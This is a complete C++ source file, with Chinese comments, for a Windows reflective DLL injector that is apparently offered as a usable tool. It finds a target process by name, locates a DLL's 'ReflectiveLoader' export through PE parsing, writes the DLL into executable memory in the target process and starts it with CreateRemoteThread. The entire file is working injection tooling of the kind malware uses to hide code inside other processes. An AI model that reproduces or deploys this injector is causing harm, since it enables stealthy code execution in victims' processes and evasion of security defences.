#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <fstream>

//获取进程 PID
DWORD GetPID(const char* procName) {
    //获得指定进程的快照
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    if (Process32First(hSnap, &pe32)) {
        do {
            //通过遍历当前所有进程的procName来寻找目标进程
            if (_stricmp(pe32.szExeFile, procName) == 0) {
                CloseHandle(hSnap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return 0;
}

//把内存里的相对地址（RVA）转换成文件在硬盘上的偏移地址（File Offset）
DWORD RvaToFileOffset(PIMAGE_NT_HEADERS pNt, DWORD rva) {
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        DWORD size = pSection->Misc.VirtualSize ? pSection->Misc.VirtualSize : pSection->SizeOfRawData;
        if (rva >= pSection->VirtualAddress && rva < (pSection->VirtualAddress + size)) {
            //核心计算公式：File Offset=RVA - 该节在内存的起始地址 + 该节在文件中的起始位置
            return rva - pSection->VirtualAddress + pSection->PointerToRawData;
        }
        pSection++;
    }
    return 0;
}

//在 Raw Data 中查找 ReflectiveLoader函数 的文件偏移
DWORD GetLoaderOffset(void* data) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)data;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((LPBYTE)data + pDos->e_lfanew);

    // 获取导出表 RVA
    DWORD exportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRva) return 0;

    // 转换导出表 RVA -> 文件偏移
    DWORD exportOffset = RvaToFileOffset(pNt, exportRva);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)data + exportOffset);

    DWORD* pNames = (DWORD*)((LPBYTE)data + RvaToFileOffset(pNt, pExport->AddressOfNames));
    WORD* pOrdinals = (WORD*)((LPBYTE)data + RvaToFileOffset(pNt, pExport->AddressOfNameOrdinals));
    DWORD* pFuncs = (DWORD*)((LPBYTE)data + RvaToFileOffset(pNt, pExport->AddressOfFunctions));

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* name = (char*)((LPBYTE)data + RvaToFileOffset(pNt, pNames[i]));
        // 查找导出函数 ReflectiveLoader
        if (strcmp(name, "ReflectiveLoader") == 0) {
            DWORD funcRva = pFuncs[pOrdinals[i]];
            return RvaToFileOffset(pNt, funcRva);
        }
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: inject.exe <process> <dll>\n");
        return 0;
    }

    // 1. 读取 DLL 到本地内存中
    std::ifstream file(argv[2], std::ios::binary | std::ios::ate);
    if (!file) { printf("[!] DLL not found\n"); return -1; }
    size_t size = file.tellg();
    std::vector<char> buffer(size);
    file.seekg(0);
    file.read(buffer.data(), size);
    file.close();

    // 2. 查找偏移
    DWORD offset = GetLoaderOffset(buffer.data());
    if (!offset) { printf("[!] ReflectiveLoader export not found!\n"); return -1; }

    // 3. 打开目标进程
    DWORD pid = GetPID(argv[1]);
    if (!pid) { printf("[!] Process not found\n"); return -1; }
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) { printf("[!] OpenProcess failed\n"); return -1; }

    // 4. 在目标进程分配内存(RWX)
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    //写入 DLL Raw Data
    if (!pRemoteMem) { printf("[!] Alloc failed\n"); return -1; }
    WriteProcessMemory(hProcess, pRemoteMem, buffer.data(), size, NULL);

    // 5. 计算远程入口地址(基址 +偏移)
    LPTHREAD_START_ROUTINE pEntry = (LPTHREAD_START_ROUTINE)((LPBYTE)pRemoteMem + offset);

    // 6. 执行 
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pEntry, pRemoteMem, 0, NULL);

    if (hThread) {
        printf("[+] Injected! Entry: %p\n", pEntry);
        CloseHandle(hThread);
    }
    else {
        printf("[!] CreateRemoteThread failed\n");
    }

    CloseHandle(hProcess);
    return 0;
}